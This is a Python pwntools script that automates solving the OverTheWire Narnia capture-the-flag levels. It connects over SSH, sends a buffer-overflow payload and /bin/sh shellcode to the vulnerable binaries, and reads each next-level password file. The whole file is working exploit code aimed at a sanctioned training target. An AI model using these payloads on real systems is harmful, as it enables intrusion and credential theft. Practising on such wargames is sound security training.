#!/usr/bin/env python3

import pwn
import os

doing = pwn.term.output(float=True)
if pwn.context.log_level == pwn.logging.INFO:
    pwn.context(log_level='ERROR')
pwn.context(arch='i386')

solutions = [  # Entry <i> is the solution to narnia<i>
    pwn.flat('A' * 20, 0xdeadbeef),
    pwn.asm(pwn.shellcraft.sh()),
    pwn.cyclic(200)
]

# Run this python script inside tmux like this:
# $> tmux
# $> ./exploit GDB
# It will spawn a separate window with the GDB session
pwn.context.terminal = ["tmux", "splitw", "-h"]

gdbscript = '''
continue
'''.format(**locals())


def ssh_connect(level_id, level_password):
    return pwn.ssh(user='narnia%d' % level_id, password=level_password, host="narnia.labs.overthewire.org", port=2226)


def start(level_id, level_password, argv=[], *a, **kw):
    """Start the exploit against the target."""
    local_path = "challenges/narnia%d" % level_id
    if pwn.args.GDB:
        return pwn.gdb.debug([local_path] + argv, gdbscript=gdbscript, *a, **kw)
    elif pwn.args.LOCAL:
        return pwn.process([local_path] + argv, *a, **kw)
    else:
        ssh = ssh_connect(level_id, level_password)
        return ssh.process(['/narnia/narnia%d' % level_id] + argv, *a, **kw)


def solve(level_id, level_password, attack):
    doing.update('Solving narnia%d\n' % level_id)
    env = None
    args = []
    if level_id == 1:
        env = {'EGG': attack}
    if level_id == 2:
        args = [attack]
    io = start(level_id, level_password, args, env=env)
    if level_id != 1 and level_id != 2:
        io.send(attack)
    io.recvrepeat(1 if not pwn.args.GDB else 10)
    if pwn.args.LOCAL or pwn.args.GDB:
        io.sendline('whoami')
        user = io.recvline().strip().decode('utf8')
        io.close()
        print('Current user for narnia%d is: %s' % (level_id + 1, user))
        return user
    else:
        io.sendline("cat /etc/narnia_pass/narnia%d" % (level_id + 1))
        next_password = io.recvline().strip().decode('utf8')
        io.close()
        print('Password for narnia%d is: %s' % (level_id + 1, next_password))
        return next_password


def download_binary_and_source(level_id, level_password):
    out_dir = 'challenges'
    source_file = os.path.join(out_dir, "narnia%d.c" % level_id)
    binary_file = os.path.join(out_dir, "narnia%d" % level_id)
    c_source_exists = os.path.exists(source_file)
    binary_exists = os.path.exists(binary_file)
    if c_source_exists and binary_exists:
        return

    doing.update('Fetching source and binary for narnia%d\n' % level_id)
    ssh = ssh_connect(level_id, level_password)
    pwn.mkdir_p(out_dir)
    if not c_source_exists:
        try:
            ssh.download_file('/narnia/narnia%d.c' % level_id, source_file)
        except:  # Fails on Windows file system, but file has been fetched
            pass
    if not binary_exists:
        try:
            ssh.download_file('/narnia/narnia%d' % level_id, binary_file)
        except:  # Fails on Windows file system, but file has been fetched
            pass
    ssh.close()


password = 'narnia0'
i = -1
for i in range(0 if not pwn.args.LAST else len(solutions)-1, len(solutions)):
    download_binary_and_source(i, password)
    password = solve(i, password, solutions[i])

download_binary_and_source(i+1, password)
